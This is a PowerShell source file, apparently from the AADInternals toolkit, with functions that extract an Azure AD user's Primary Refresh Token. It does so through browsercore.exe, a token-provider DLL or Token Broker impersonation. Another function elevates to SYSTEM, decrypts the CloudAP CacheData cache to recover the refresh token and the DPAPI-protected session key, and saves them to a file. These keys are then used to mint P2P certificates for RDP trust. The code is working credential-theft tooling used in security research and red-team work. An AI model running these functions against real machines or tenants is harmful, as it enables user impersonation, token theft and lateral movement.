# This file contains functions for Persistent Refresh Token and related device operations

# Get the PRT token from the current user
# Aug 19th 2020
# Sep 25th 2024 Added support for CloudAP
function Get-UserPRTToken
{
<#
    .SYNOPSIS
    Gets user's PRT token from the Azure AD joined or Hybrid joined computer.

    .DESCRIPTION
    Gets user's PRT token from the Azure AD joined or Hybrid joined computer.
    Uses browsercore.exe, Token Provider DLL, or CloudAP to get the PRT token.

    .Parameter Method
    Method to use to retrieve the user's PRT token.
    "BrowserCore" for browsercore.exe, "TokenProvider" for Token Provider DLL, or "CloudAP" for impersonating AAD Token Broker

    .EXAMPLE
    PS C:\> Get-AADIntUserPRTToken
    eyJ4NWMiOi...
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [ValidateSet('BrowserCore','TokenProvider','CloudAP')]
        [String]$Method="BrowserCore"
    )
    Process
    {

        # Get the nonce
        $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body "grant_type=srv_challenge"
        $nonce = $response.Nonce

        if($Method -eq "BrowserCore")
        {
            # There are two possible locations
            $locations = @(
                "$($env:ProgramFiles)\Windows Security\BrowserCore\browsercore.exe"
                "$($env:windir)\BrowserCore\browsercore.exe"
            )

            # Check the locations
            foreach($file in $locations)
            {
                if(Test-Path $file)
                {
                    $browserCore = $file
                }
            }

            if(!$browserCore)
            {
                throw "Browsercore not found!"
            }

            # Create the process
            $p = New-Object System.Diagnostics.Process
            $p.StartInfo.FileName = $browserCore
            $p.StartInfo.UseShellExecute = $false
            $p.StartInfo.RedirectStandardInput = $true
            $p.StartInfo.RedirectStandardOutput = $true
            $p.StartInfo.CreateNoWindow = $true

            # Create the message body
            $body = @"
            {
                "method":"GetCookies",
                "uri":"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=$nonce",
                "sender":"https://login.microsoftonline.com"
            }
"@
            # Start the process
            $p.Start() | Out-Null
            $stdin =  $p.StandardInput
            $stdout = $p.StandardOutput

            # Write the input
            $stdin.BaseStream.Write([bitconverter]::GetBytes($body.Length),0,4) 
            $stdin.Write($body)
            $stdin.Close()

            # Read the output
            $response=""
            while(!$stdout.EndOfStream)
            {
                $response += $stdout.ReadLine()
            }

            Write-Debug "RESPONSE: $response"
        
            $p.WaitForExit()

            # Strip the stuff from the beginning of the line
            $response = $response.Substring($response.IndexOf("{")) | ConvertFrom-Json

            # Check for error
            if($response.status -eq "Fail")
            {
                Throw "Error getting PRT: $($response.code). $($response.description)"
            }

            # Get the index of the x-ms-RefreshTokenCredential data or throw error
            $token_index = $response.response.name.IndexOf("x-ms-RefreshTokenCredential")
            if($token_index -lt 0)
            {
                throw "Could not find the x-ms-RefreshTokenCredential cookie in response"
            }

            # Return the data for x-ms-RefreshTokenCredential
            $tokens = $response.response[$token_index].data
            return $tokens
        }
        elseif($Method -eq "TokenProvider")
        {
            $tokens = [AADInternals.Native]::getCookieInfoForUri("https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=$nonce")

            if($tokens.Count)
            {
                Write-Verbose "Found $($tokens.Count) token(s)."

                # Get the index of the x-ms-RefreshTokenCredential data or throw error
                $token_index = $tokens.name.IndexOf("x-ms-RefreshTokenCredential")
                if($token_index -lt 0)
                {
                    throw "Could not find the x-ms-RefreshTokenCredential cookie in response"
                }

                # Return the data for x-ms-RefreshTokenCredential
                $token = $tokens[$token_index]["data"]
                
                return $token.Split(";")[0]
            }
            else
            {
                Throw "Error getting tokens."
            }

        }
        else # Get token from CloudAP by impersonating AAD TokenBroker 
        {
            return [AADInternals.Native]::RequestSSOCookie($nonce)
        }

    }
}

# Get logged in user's PRT and Session key from CloudAP CacheData
# Jun 2nd 2023
function Get-UserPRTKeysFromCloudAP
{
<#
    .SYNOPSIS
    Extracts the session key and primary refresh token from CloudAP cache and saves them to json file.

    .DESCRIPTION
    Extracts the session key and primary refresh token from CloudAP cache and saves them to json file.
    
    .Parameter Username
    The username of the user

    .Parameter Password
    The password of the user.

    .Parameter Credentials
    Credentials of the user.

	.Example
	PS C\:>$creds = Get-Credential
    PS C\:>$prtKeys = Get-AADIntUserPRTKeysFromCloudAP -Credentials $creds
	
	Keys saved to 31abceff-a84c-4f3b-9461-582435d7d448.json

    PS C:\>$prttoken = New-AADIntUserPRTToken -Settings $prtkeys

#>
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName='Credentials',Mandatory=$True)]
        [System.Management.Automation.PSCredential]$Credentials,

        [Parameter(ParameterSetName='SystemPassword',Mandatory=$true)]
        [string]$HexPassword,

        [Parameter(ParameterSetName='Password',Mandatory=$true)]
        [string]$Password,

        [Parameter(ParameterSetName='Password',Mandatory=$true)]
        [Parameter(ParameterSetName='SystemPassword',Mandatory=$true)]
        [string]$Username
    )
    Begin
    {
        $WAM_AAD = "B16898C6-A148-4967-9171-64D755DA8520"
        $WAM_MSA = "D7F9888F-E3FC-49b0-9EA6-A85B5F392A4F"
    }
    Process
    {
        # Check whether we are running in elevated session
        Test-LocalAdministrator -Throw | Out-Null
  
        if($Credentials)
        {
            $Username = $Credentials.UserName
            $Password = $Credentials.GetNetworkCredential().Password
        }

        # Elevate to LOCAL SYSTEM
        if((Get-CurrentUser) -ne "NT AUTHORITY\SYSTEM")
        {
            $cmdToRun = "Set-Location '$PSScriptRoot';. '.\Win32Ntv.ps1';. '.\CommonUtils.ps1';. '.\CommonUtils_endpoints.ps1';. '.\PRT_Utils.ps1';. '.\PRT.ps1'; Get-UserPRTKeysFromCloudAP -Username $Username -Password $password"
            if($HexPassword)
            {
                $cmdToRun += " -HexPassword $HexPassword"
            }
                
            try
            {
                $prtKeysJson = Invoke-ScriptAs -Command $cmdToRun -Credentials $ADSyncCredentials.Credentials
                Write-Verbose "Invoke-ScriptAs response: $prtKeysJson"
                $prtKeys = ConvertFrom-Json -InputObject $prtKeysJson
            }
            catch
            {
                throw "Unable to get PRT token and session key"
            }

        }
        else
        {
            # Find the user from registry
            $name2SidPath = "HKLM:\SOFTWARE\Microsoft\IdentityStore\LogonCache\$WAM_AAD\Name2Sid\"
            $name2SidKey = Get-Item -Path $name2SidPath -ErrorAction SilentlyContinue
        
            if($name2SidKey)
            {
                $users = $name2SidKey.GetSubKeyNames()
            }

            if($users -eq $null)
            {
                Throw "No users found from CacheData"
            }

            foreach($user in $users)
            {
                if((Get-ItemPropertyValue -Path "$name2SidPath$user" -Name IdentityName) -eq $username)
                {
                    # We found the user from registry. Get the cachedir from the key name.
                    $cacheDir = (Get-Item -Path "$name2SidPath$user").PSChildName
                    Write-Verbose "Cachedir:               $cacheDir"

                    # Create the cache data file path
                    $cacheDataFile = "$env:SystemRoot\system32\config\systemprofile\AppData\local\microsoft\windows\CloudAPCache\AzureAD\$cacheDir\Cache\CacheData"
                    break
                }
            }

            if([string]::IsNullOrEmpty($cacheDataFile))
            {
                Throw "CacheData not found for user $Username"
            }
            $CacheData = Get-BinaryContent -Path $cacheDataFile

            # Parse CacheData
            $cacheNodes = Parse-CloudAPCacheData -Data $CacheData

            $defaultIV = @(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)

            foreach($node in $cacheNodes)
            {
                switch($node.Type)
                {
                    # Ref: https://github.com/synacktiv/CacheData_decrypt/blob/main/scripts/parse_cachedata.py
                    1 # Password
                    {
                        if($HexPassword)
                        {
                            $systemPassword = Convert-HexToByteArray -HexString $HexPassword
                            # Derive the key from the given "system" password
                            $derivedKey = [AADInternals.Native]::getPBKDF2($systemPassword)
            
                            Write-Verbose "Derived key:            $(Convert-ByteArrayToHex -Bytes $derivedKey)"

                            # Decrypt the secret using derived key
                            $aes     = New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
                            $aes.Key = $derivedKey
                            $aes.IV  = $defaultIV
                            $dc      = $aes.CreateDecryptor()
                            $secret  = $dc.TransformFinalBlock($node.CryptoBlob,0,$node.CryptoBlobSize)
                        }
                        else
                        {
                            # The secret is actually derived from the user's password, so we can use that (if known)
                            $secret = [AADInternals.Native]::getPBKDF2([text.encoding]::Unicode.GetBytes($Password))
                        }

                        Write-Verbose "Secret:                 $(Convert-ByteArrayToHex -Bytes $secret)"

                        # Decrypt the data blob with the secret
                        $aes      = New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
                        $aes.Key  = $secret
                        $aes.IV   = $defaultIV
                        $dc       = $aes.CreateDecryptor()
                        $dataBlob = $dc.TransformFinalBlock($node.EncryptedBlob,0,$node.EncryptedBlobSize)
                        break
                    }
                    4 # Smart Card
                    {
                        break
                    }
                    5 # PIN
                    {
                        break
                    }
                }

                # Return the first found blob
                if($dataBlob)
                {
                    # Parse the data blob
                    $prtBytes = Parse-CloudAPEncryptedBlob -Data $dataBlob 
                    $prt      = [text.encoding]::UTF8.GetString($prtBytes) | ConvertFrom-Json

                    # Decode PRT
                    $prt | Add-Member -NotePropertyName "refresh_token" -NotePropertyValue (Convert-B64ToText -B64 $prt.prt)

                    # Decrypt POP Key (Session Key) using DPAPI
                    $prt | Add-Member -NotePropertyName "session_key" -NotePropertyValue (Convert-ByteArrayToB64 -Bytes (Unprotect-POPKeyBlob -Data (Convert-B64ToByteArray -B64 $prt.ProofOfPossesionKey.KeyValue)))

                    return $prt | ConvertTo-Json
                }
            }
        }

        # Write to file
        $outFileName = "$($prtKeys.deviceId).json"
        $prtKeys | ConvertTo-Json | Set-Content $outFileName -Encoding UTF8
        Write-Host "Keys saved to $outFileName"

        return $prtKeys
    }
}
# Generates a new P2P certificate
# Aug 21st 2020
function New-P2PDeviceCertificate
{
<#
    .SYNOPSIS
    Creates a new P2P device or user certificate using the device certificate or PRT information.

    .DESCRIPTION
    Creates a new peer-to-peer (P2P) device or user certificate and exports it and the corresponding CA certificate. 
    It can be used to enable RDP trust between devices of the same AAD tenant.

    .EXAMPLE
    Get-AADIntAccessTokenForAADJoin -SaveToCache
    PS\:>Join-AADIntAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"

    .Parameter Certificate
    x509 certificate used to sign the certificate request.

    .Parameter PfxFileName
    File name of the .pfx certificate used to sign the certificate request.

    .Parameter PfxPassword
    The password of the .pfx certificate used to sign the certificate request.

    .Parameter TenantId
    The tenant id or name of users' tenant.

    .Parameter DeviceName
    The name of the device. Will be added to DNS Names attribute of the certificate.

    .Parameter OSVersion
    The operating system version of the device. Defaults to "10.0.18363.0"

    .Parameter RefreshToken
    Primary Refresh Token (PRT) or the user.

    .Parameter SessionKey
    The session key of the user

    .Parameter Context
    The context used = B64 encoded byte array (size 24)

    .Parameter Settings
    PSObject containing refresh_token and session_key attributes.

    .EXAMPLE
    PS C\:>New-AADIntP2PDeviceCertificate -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -DeviceName "mypc1.company.com"

    Device P2P certificate successfully created:
      Subject:         "CN=d03994c9-24f8-41ba-a156-1805998d6dc7, DC=4169fee0-df47-4e31-b1d7-5d248222b872"
      DnsName:         "mypc1.company.com"
      Issuer:          "CN=MS-Organization-P2P-Access [2020]"
      Cert thumbprint: 84D7641F9BFA90767EA3456E443E21948FC425E5
      Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7-P2P.pfx"
      CA file name :   "d03994c9-24f8-41ba-a156-1805998d6dc7-P2P-CA.der"

    .EXAMPLE
    Get-AADIntAccessTokenForAADJoin -SaveToCache
    PS C:\>Join-AADIntAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"

    Device successfully registered to Azure AD:
      DisplayName:     "My computer"
      DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
      Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
      Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
    Local SID:
      S-1-5-32-544
    Additional SIDs:
      S-1-12-1-797902961-1250002609-2090226073-616445738
      S-1-12-1-3408697635-1121971140-3092833713-2344201430
      S-1-12-1-2007802275-1256657308-2098244751-2635987013

    PS C:\>$creds = Get-Credential

    PS C:\>$prtKeys = Get-UserAADIntPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -Credentials $cred

    PS C:\>New-AADIntP2PDeviceCertificate -RefreshToken $prtKeys.refresh_token -SessionKey $prtKeys.session_key

    User certificate successfully created:
      Subject:         "CN=TestU@contoso.com, CN=S-1-12-1-xx-xx-xx-xx, DC=0f73eaa6-7fd6-48b8-8897-e382ba96daf4"
      Issuer:          "CN=MS-Organization-P2P-Access [2020]"
      Cert thumbprint: A7F1D1F134569E0234E6AA722354D99C3AA68D0F
      Cert file name : "TestU@contoso.com-P2P.pfx"
      CA file name :   "TestU@contoso.com-P2P-CA.der"

#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName='Certificate',Mandatory=$True)]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,

        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$True)]
        [string]$PfxFileName,
        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$False)]
        [string]$PfxPassword,

        [Parameter(ParameterSetName='TokenAndKey',Mandatory=$True)]
        [String]$RefreshToken,
        [Parameter(ParameterSetName='TokenAndKey',Mandatory=$True)]
        [String]$SessionKey,
        [Parameter(Mandatory=$False)]
        [String]$Context,
        [Parameter(ParameterSetName='Settings',Mandatory=$True)]
        $Settings,
   
        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$True)]
        [Parameter(ParameterSetName='Certificate',Mandatory=$True)]
        [String]$TenantId,
        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$True)]
        [Parameter(ParameterSetName='Certificate',Mandatory=$True)]
        [String]$DeviceName,
        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$False)]
        [Parameter(ParameterSetName='Certificate',Mandatory=$False)]
        [String]$OSVersion="10.0.18363.0",
        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$False)]
        [Parameter(ParameterSetName='Certificate',Mandatory=$False)]
        [String[]]$DNSNames
    )
    Process
    {
        if($Settings)
        {
            if([string]::IsNullOrEmpty($Settings.refresh_token) -or [string]::IsNullOrEmpty($Settings.session_key))
            {
                throw "refresh_token and/or session_key missing!"
            }
            $RefreshToken = $Settings.refresh_token
            $SessionKey =   $Settings.session_key
        }

        if($SessionKey -ne $null -and [string]::IsNullOrEmpty($Context))
        {
            # Create a random context
            $ctx = New-Object byte[] 24
            ([System.Security.Cryptography.RandomNumberGenerator]::Create()).GetBytes($ctx)
        }
        elseif($Context)
        {
            $ctx = Convert-B64ToByteArray -B64 $Context
        }

        if($Certificate -eq $null -and [string]::IsNullOrEmpty($PfxFileName) -eq $false)
        {
            $Certificate = Load-Certificate -FileName $PfxFileName -Password $PfxPassword -Exportable
        }

        if(!$DNSNames)
        {
            $DNSNames = @($DeviceName)
        }

        if($Certificate)
        {
            $TenantId = (Parse-CertificateOIDs -Certificate $Certificate).TenantId
        }

        if(!$TenantId)
        {
            $TenantId = (Read-Accesstoken $prtKeys.id_token).tid
        }

        # Get the nonce
        $nonce = (Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$TenantId/oauth2/token" -Body "grant_type=srv_challenge").Nonce

        # We are doing this with the existing device certificate
        if($Certificate)
        {
            # Get the private key
            $privateKey = Load-PrivateKey -Certificate $Certificate 
        
            # Initialize the Certificate Signing Request object
            $CN =  $Certificate.Subject
            $req = [System.Security.Cryptography.X509Certificates.CertificateRequest]::new($CN, $privateKey, [System.Security.Cryptography.HashAlgorithmName]::SHA256,[System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
        
            # Create the signing request
            $csr = [convert]::ToBase64String($req.CreateSigningRequest())

            # B64 encode the public key
            $x5c = [convert]::ToBase64String(($certificate.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert)))

            # Create the header and body
            $hdr = [ordered]@{
                "alg" = "RS256"
                "typ" = "JWT"
                "x5c" = "$x5c"
            }

            $pld = [ordered]@{
                "client_id" =      "38aa3b87-a06d-4817-b275-7a316988d93b"
                "request_nonce" =  $nonce
                "win_ver" =        $OSVersion
                "grant_type" =     "device_auth"
                "cert_token_use" = "device_cert"
                "csr_type" =       "http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10"
                "csr" =            $csr
                "netbios_name" =   $DeviceName
                "dns_names" =      $DNSNames
            }

            # Create the JWT
            $jwt = New-JWT -PrivateKey $privateKey -Header $hdr -Payload $pld
        
            # Construct the body
            $body = @{
                "windows_api_version" = "2.0"
                "grant_type"          = "urn:ietf:params:oauth:grant-type:jwt-bearer"
                "request"             = "$jwt"
            }
        }
        else # We are doing this with the PRT keys information
        {
            # Create a private key and do something with it to get it stored
            $rsa=[System.Security.Cryptography.RSA]::Create(2048)

            # Store the private key to so that it can be exported
            $cspParameters = [System.Security.Cryptography.CspParameters]::new()
            $cspParameters.ProviderName =    "Microsoft Enhanced RSA and AES Cryptographic Provider"
            $cspParameters.ProviderType =    24
            $cspParameters.KeyContainerName ="AADInternals"
            
            # Set the private key
            $privateKey = [System.Security.Cryptography.RSACryptoServiceProvider]::new(2048,$cspParameters)
            $privateKey.ImportParameters($rsa.ExportParameters($true))
                
            # Initialize the Certificate Signing Request object
            $req = [System.Security.Cryptography.X509Certificates.CertificateRequest]::new("CN=", $rsa, [System.Security.Cryptography.HashAlgorithmName]::SHA256,[System.Security.Cryptography.RSASignaturePadding]::Pkcs1)

            # Create the signing request
            $csr = [convert]::ToBase64String($req.CreateSigningRequest())

            # Create the header and body
            $hdr = [ordered]@{
                "alg" = "HS256"
                "typ" = "JWT"
                "ctx" = (Convert-ByteArrayToB64 -Bytes $ctx)
            }

            $pld = [ordered]@{
                "iss" =            "aad:brokerplugin"
                "grant_type" =     "refresh_token"
                "aud" =            "login.microsoftonline.com"
                "request_nonce" =  $nonce
                "scope" =          "openid aza ugs"
                "refresh_token" =  $RefreshToken
                "client_id" =      "38aa3b87-a06d-4817-b275-7a316988d93b"
                "cert_token_use" = "user_cert"
                "csr_type" =       "http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10"
                "csr" =            $csr
            }

            # Create the JWT
            $jwt = New-JWT -Key (Get-PRTDerivedKey -Context $ctx -SessionKey (Convert-B64ToByteArray $SessionKey))  -Header $hdr -Payload $pld
        
            # Construct the body
            $body = @{
                "grant_type"          = "urn:ietf:params:oauth:grant-type:jwt-bearer"
                "request"             = "$jwt"
                "windows_api_version" = "1.0"
            }
        }

        try
        {
            # Make the request to get the P2P certificate
            $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$tenantId/oauth2/token" -ContentType "application/x-www-form-urlencoded" -Body $body
        }
        catch
        {
            $errorMessage = $_.ErrorDetails.Message | ConvertFrom-Json 
            Write-Error $errorMessage.error_description
            return
        }

        # Get the certificate
        $binCert = [byte[]](Convert-B64ToByteArray -B64 $response.x5c)

        # Create a new x509certificate 
        $P2PCert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($binCert,"",[System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::PersistKeySet -bor [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
        $P2PCert.PrivateKey = $privateKey

        # Write the device P2P certificate to disk
        $certName = $P2PCert.Subject.Split(",")[0].Split("=")[1]
        Set-BinaryContent -Path "$certName-P2P.pfx" -Value $P2PCert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)

        # Write the P2P certificate CA to disk
        $CA = @"
-----BEGIN PUBLIC KEY-----
$($response.x5c_ca)
-----END PUBLIC KEY-----
"@
        $CA | Set-Content "$certName-P2P-CA.der"

        if($Certificate)
        {
            # Unload the private key
            Unload-PrivateKey -PrivateKey $privateKey
        }

        # Print out information
        if($Certificate)
        {
            Write-Host "Device P2P certificate successfully created:"
        }
        else
        {
            Write-Host "User certificate successfully created:"
        }
        Write-Host "  Subject:         ""$($P2PCert.Subject)"""
        if($Certificate)
        {
            Write-Host "  DnsNames:        ""$($P2PCert.DnsNameList.Unicode)"""
        }
        Write-Host "  Issuer:          ""$($P2PCert.Issuer)"""
        Write-Host "  Cert thumbprint: $($P2PCert.Thumbprint)"
        Write-host "  Cert file name : ""$certName-P2P.pfx"""
        Write-host "  CA file name :   ""$certName-P2P-CA.der"""

    }
}
